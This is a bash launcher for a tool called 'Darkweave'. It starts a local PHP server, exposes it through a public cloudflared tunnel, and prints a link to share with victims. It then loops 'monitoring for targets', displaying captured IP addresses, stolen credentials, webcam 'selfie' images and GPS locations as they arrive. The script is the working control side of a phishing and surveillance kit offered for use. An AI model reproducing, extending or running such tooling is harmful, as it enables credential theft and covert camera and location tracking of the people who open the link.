#!/bin/bash
# Darkweave Launcher

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

clear
cat << "EOF"
    ╔═══════════════════════════════════════════════════╗
    ║     DARKWEAVE v1.0 - INTELLIGENCE FRAMEWORK       ║
    ╚═══════════════════════════════════════════════════╝
EOF

# Kill existing processes
pkill -f "php -S" 2>/dev/null
pkill -f cloudflared 2>/dev/null

# Start PHP server
echo -e "${GREEN}[+]${NC} Starting PHP server..."
php -S 0.0.0.0:8080 -t . > /dev/null 2>&1 &
PHP_PID=$!
sleep 2

# Download Cloudflared
if [ ! -f "cloudflared" ]; then
    echo -e "${GREEN}[+]${NC} Downloading Cloudflared..."
    wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared
    chmod +x cloudflared
fi

# Start tunnel
echo -e "${GREEN}[+]${NC} Starting tunnel..."
./cloudflared tunnel --url 127.0.0.1:8080 > .tunnel.log 2>&1 &
sleep 8

# Get link
LINK=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' .tunnel.log | head -1)

if [ -n "$LINK" ]; then
    echo -e "\n${GREEN}════════════════════════════════════════════════════════════${NC}"
    echo -e "${GREEN}[✓] TUNNEL READY!${NC}"
    echo -e "${BLUE}🔗 SHARE: ${LINK}${NC}"
    echo -e "${YELLOW}⚠️  Press Ctrl+C to stop${NC}"
    echo -e "${GREEN}════════════════════════════════════════════════════════════${NC}\n"
    
    # Monitor output
    echo -e "${GREEN}[+] Monitoring for targets...${NC}\n"
    
    while true; do
        # Check for new data
        if [ -f "output/ip.txt" ]; then
            echo -e "${GREEN}[+] New Connection!${NC}"
            cat output/ip.txt
            echo ""
            mv output/ip.txt "output/ip_$(date +%H%M%S).txt" 2>/dev/null
        fi
        
        if [ -f "output/credentials.txt" ]; then
            echo -e "${RED}[!] CREDENTIALS CAPTURED!${NC}"
            cat output/credentials.txt
            echo ""
            mv output/credentials.txt "output/creds_$(date +%H%M%S).txt" 2>/dev/null
        fi
        
        if ls output/cam_*.png 2>/dev/null | grep -q .; then
            for img in output/cam_*.png; do
                if [ -f "$img" ]; then
                    echo -e "${GREEN}[+] Selfie:${NC} $(basename "$img")"
                fi
            done
        fi
        
        if [ -f "output/gps.txt" ]; then
            echo -e "${GREEN}[+] GPS Location!${NC}"
            cat output/gps.txt
            echo ""
            mv output/gps.txt "output/gps_$(date +%H%M%S).txt" 2>/dev/null
        fi
        
        sleep 2
    done
else
    echo -e "${RED}[!] Tunnel failed. Check internet.${NC}"
    exit 1
fi
